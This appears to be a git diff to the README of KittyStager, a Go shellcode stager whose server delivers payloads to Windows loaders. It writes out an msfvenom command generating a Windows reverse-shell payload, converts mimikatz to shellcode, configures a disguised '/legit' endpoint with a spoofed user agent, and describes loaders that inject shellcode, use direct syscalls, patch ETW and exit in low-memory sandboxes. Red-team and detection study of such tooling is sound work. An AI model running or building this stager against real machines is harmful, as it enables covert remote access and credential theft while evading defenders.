@@ -36,8 +36,9 @@ able to use the with any shellcode.
 ![](/img/workfow.svg)
 
 ## Quick start
-How to compile
 The kittens are for windows only, but the server can be run on any OS.
+
+How to compile :
 ```
 go build -o kittyStager
 ./kittyStager
@@ -51,6 +52,18 @@ Generate a shellcode. It works with any shellcode in bin format or in hex format
 ```
 msfvenom -p windows/x64/shell_reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444
 go-donut.exe -i mimikatz.exe
+```
+The config file under `KittyStager/cmd/config` :
+```yaml
+Http:
+  host: "127.0.0.1"
+  port: 8080
+  endpoint: "/legit"
+  sleep: 5
+  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/102.0"
+  malPath:
+    - "kitten/basicKitten/"
+    - "kitten/bananaKitten/"
 ```
 ```
 ~kittyStager ❯.\kittyStager.exe -p path/to/config/file
@@ -67,8 +80,8 @@ go-donut.exe -i mimikatz.exe
 KittyStager - A simple stager written in Go
 
 [+] Config loaded
-[+] Generated conf file for C:\Users\yanng\go\Project_go\GoStager\kitten\basicKitten
-[+] Generated conf file for C:\Users\yanng\go\Project_go\GoStager\kitten\bananaKitten
+[+] Generated conf file for C:\Users\enelg\KittyStager\kitten\basicKitten
+[+] Generated conf file for C:\Users\enelg\KittyStager\kitten\bananaKitten
 [+] Config file generated
 [+] Starting http server
 [+] Sleep set to 5s on all targets
@@ -91,7 +104,7 @@ id: 1
 
 KittyStager - 127.0.0.1 🐈❯ shellcode
 [*] Please enter the path to the shellcode
-Path: ..\..\shellcode\shellcode.bin
+Path: shellcode\shellcode.bin
 [+] Key generated is : TARGETTARGETTARGETTARGETTARGET
 [+] Shellcode hosted for 127.0.0.1 
 ```
@@ -117,7 +130,7 @@ This is the basic kitten, and it has the minimum to work. No fancy injection met
 `VirtualAlloc` -> `RtlCopyMemory` -> `VirtualProtect` -> `CreateThread` -> `WaitForSingleObject`. Use this as example if you want to develop your own kitten.
 ### [BananaKitten](/kitten/bananaKitten)
 This is the more advanced kitten. It will use bananaphone, a variant of hell's gate implemented in Go. [https://github.com/C-Sto/BananaPhone](https://github.com/C-Sto/BananaPhone)
-It also patches etw. 
+It also patches etw and has a sandbox escape mechanism, that check's if there is more than 1 Gb of ram. If not, it will exit.
 
 ## Project structure
 ### [kitten](/kitten)
